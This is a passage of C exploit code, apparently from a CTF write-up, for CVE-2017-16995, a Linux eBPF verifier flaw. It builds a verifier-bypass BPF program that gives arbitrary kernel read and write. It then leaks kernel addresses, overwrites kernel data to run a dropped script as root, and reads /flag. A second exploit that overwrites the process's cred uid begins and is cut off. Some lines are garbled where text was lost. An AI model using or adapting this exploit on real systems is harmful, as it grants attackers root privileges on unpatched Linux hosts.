            .license = ptr_to_u64((void *) license),
            .log_buf = ptr_to_u64(bpf_log_buf),
            .log_size = LOG_BUF_SIZE,
            .log_level = 1,
        };
        attr.kern_version = kern_version;
        bpf_log_buf[0] = 0;
        return syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
    }
    int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,
               int max_entries, int map_flags)
    {
        union bpf_attr attr = {
            .map_type = map_type,
            .key_size = key_size,
            .value_size = value_size,
            .max_entries = max_entries
        };
        return syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
    }
    int bpf_update_elem(int fd, void *key, void *value, unsigned long long flags)
    {
        union bpf_attr attr = {
            .map_fd = fd,
            .key = ptr_to_u64(key),
            .value = ptr_to_u64(value),
            .flags = flags,
        };
        return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
    }
    int bpf_lookup_elem(int fd, void *key, void *value)
    {
        union bpf_attr attr = {
            .map_fd = fd,
            .key = ptr_to_u64(key),
            .value = ptr_to_u64(value),
        };
        return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
    }
    #define BPF_ALU64_IMM(OP, DST, IMM)                \
        ((struct bpf_insn) {                    \
            .code  = BPF_ALU64 | BPF_OP(OP) | BPF_K,    \
            .dst_reg = DST,                    \
            .src_reg = 0,                    \
            .off   = 0,                    \
            .imm   = IMM })
    #define BPF_MOV64_REG(DST, SRC)                    \
        ((struct bpf_insn) {                    \
            .code  = BPF_ALU64 | BPF_MOV | BPF_X,        \
            .dst_reg = DST,                    \
            .src_reg = SRC,                    \
            .off   = 0,                    \
            .imm   = 0 })
    #define BPF_MOV32_REG(DST, SRC)                    \
        ((struct bpf_insn) {                    \
            .code  = BPF_ALU | BPF_MOV | BPF_X,        \
            .dst_reg = DST,                    \
            .src_reg = SRC,                    \
            .off   = 0,                    \
            .imm   = 0 })
    #define BPF_MOV64_IMM(DST, IMM)                    \
        ((struct bpf_insn) {                    \
            .code  = BPF_ALU64 | BPF_MOV | BPF_K,        \
            .dst_reg = DST,                    \
            .src_reg = 0,                    \
            .off   = 0,                    \
            .imm   = IMM })
    #define BPF_MOV32_IMM(DST, IMM)                    \
        ((struct bpf_insn) {                    \
            .code  = BPF_ALU | BPF_MOV | BPF_K,        \
            .dst_reg = DST,                    \
            .src_reg = 0,                    \
            .off   = 0,                    \
            .imm   = IMM })
    #define BPF_LD_IMM64(DST, IMM)                    \
        BPF_LD_IMM64_RAW(DST, 0, IMM)
    #define BPF_LD_IMM64_RAW(DST, SRC, IMM)                \
        ((struct bpf_insn) {                    \
            .code  = BPF_LD | BPF_DW | BPF_IMM,        \
            .dst_reg = DST,                    \
            .src_reg = SRC,                    \
            .off   = 0,                    \
            .imm   = (__u32) (IMM) }),            \
        ((struct bpf_insn) {                    \
            .code  = 0,                     \
            .dst_reg = 0,                    \
            .src_reg = 0,                    \
            .off   = 0,                    \
            .imm   = ((__u64) (IMM)) >> 32 })
    #ifndef BPF_PSEUDO_MAP_FD
    # define BPF_PSEUDO_MAP_FD    1
    #endif
    #define BPF_LD_MAP_FD(DST, MAP_FD)                \
        BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)
    /* Memory load, dst_reg = *(uint *) (src_reg + off16) */
    #define BPF_LDX_MEM(SIZE, DST, SRC, OFF)            \
        ((struct bpf_insn) {                    \
            .code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,    \
            .dst_reg = DST,                    \
            .src_reg = SRC,                    \
            .off   = OFF,                    \
            .imm   = 0 })
    #define BPF_ST_MEM(SIZE, DST, OFF, IMM)                \
        ((struct bpf_insn) {                    \
            .code  = BPF_ST | BPF_SIZE(SIZE) | BPF_MEM,    \
            .dst_reg = DST,                    \
            .src_reg = 0,                    \
            .off   = OFF,                    \
            .imm   = IMM })
    /* Memory store, *(uint *) (dst_reg + off16) = src_reg */
    #define BPF_STX_MEM(SIZE, DST, SRC, OFF)            \
        ((struct bpf_insn) {                    \
            .code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,    \
            .dst_reg = DST,                    \
            .src_reg = SRC,                    \
            .off   = OFF,                    \
            .imm   = 0 })
    /* Conditional jumps against immediates, if (dst_reg 'op' imm32) goto pc + off16 */
    #define BPF_JMP_IMM(OP, DST, IMM, OFF)                \
        ((struct bpf_insn) {                    \
            .code  = BPF_JMP | BPF_OP(OP) | BPF_K,        \
            .dst_reg = DST,                    \
            .src_reg = 0,                    \
            .off   = OFF,                    \
            .imm   = IMM })
    /* Raw code statement block */
    #define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)            \
        ((struct bpf_insn) {                    \
            .code  = CODE,                    \
            .dst_reg = DST,                    \
            .src_reg = SRC,                    \
            .off   = OFF,                    \
            .imm   = IMM })
    #define BPF_EXIT_INSN()                        \
        ((struct bpf_insn) {                    \
            .code  = BPF_JMP | BPF_EXIT,            \
            .dst_reg = 0,                    \
            .src_reg = 0,                    \
            .off   = 0,                    \
            .imm   = 0 })
    #define BPF_BYPASS_CHECK()                                                       \
        BPF_MOV32_IMM(BPF_REG_2, 0xFFFFFFFF),               \
        BPF_JMP_IMM(BPF_JNE, BPF_REG_2, 0xFFFFFFFF, 2),     \
        BPF_MOV64_IMM(BPF_REG_0, 0),                         \
        BPF_EXIT_INSN()                                     
    #define BPF_GET_MAP_FD(idx, dst)                                                                    \
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),        /*mov64 reg1, reg9=mapfd*/                          \
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),       /*mov64 reg2, fp */                                 \
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),      /*reg2 = reg2-4=fp-4*/                              \
        BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),     /*(u64 *)(fp-4) = idx*/                             \
        BPF_RAW_INSN(BPF_JMP|BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),                              \
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),      /*if(r0 == 0){exit(0)}else{jmp 1}*/                 \
        BPF_EXIT_INSN(),                                                                                \
        BPF_LDX_MEM(BPF_DW, dst, BPF_REG_0, 0)      // dst = *(u64 *)(r0)=map[0]
    static int load_prog() {
        struct bpf_insn prog[] = {
            BPF_BYPASS_CHECK(),
            BPF_LD_MAP_FD(BPF_REG_9, mapfd),        //r9=mapfd
            BPF_GET_MAP_FD(0, BPF_REG_6),       //r6=map[0]=op
            BPF_GET_MAP_FD(1, BPF_REG_7),       //r7=map[1]=addr
            BPF_GET_MAP_FD(2, BPF_REG_8),       //r8=map[2]=value
            BPF_MOV64_REG(BPF_REG_2, BPF_REG_0),               /* r2 = r0=&map[2]               */
            BPF_MOV64_IMM(BPF_REG_0, 0),                       /* r0 = 0  for exit(0)   */
            //get *(u64 *)(fp+0x28)=ret_addr
            BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 1, 3),
            BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_10, 0x28),   //r3 = *(fp+0x28)=ret_addr
            BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_3, 0),        //*r2=map[2]=r3
            BPF_EXIT_INSN(),
            //write
            BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0),                            //*r7=r8
            BPF_EXIT_INSN(),
        };
        return bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, prog, sizeof(prog), "GPL", 0);
    }
    void Output(const char *fmt, ...){
        va_list args;
        va_start(args, fmt);
        fprintf(stdout, "[+] ");
        vfprintf(stdout, fmt, args);
        va_end(args);
    }
    void print(const char *fmt, ...){
        va_list args;
        va_start(args, fmt);
        fprintf(stdout, "[-] ");
        vfprintf(stdout, fmt, args);
        va_end(args);
    }
    void init_bpf()
    {
        Output("CVE-2017-16995\n");
        Output("bpf create map\n");
        mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(long long), 3, 0);
        if(mapfd  /tmp/l.sh");
        system("chmod +x /tmp/l.sh");
        system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/ll");
        system("chmod +x /tmp/ll");
    }
    int main(){
        init_sh();
        init_bpf();
        leak_kernel();
        write_mod();
        system("/tmp/ll");
        system("cat /flag");
        return 0;
    }
覆写`cred`:
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    char buffer[64];
    int sockets[2];
    int mapfd, progfd;
    int doredact = 0;
    size_t cred_offset = 0x9b8;
    size_t uid_offset = 4;
    #define LOG_BUF_SIZE 65536
    #define PHYS_OFFSET 0xffff880000000000
    char bpf_log_buf[LOG_BUF_SIZE];
    void Err(const char *fmt, ...){
        va_list args;
        va_start(args, fmt);
        fprintf(stdout, "[!] ");
        vfprintf(stdout, fmt, args);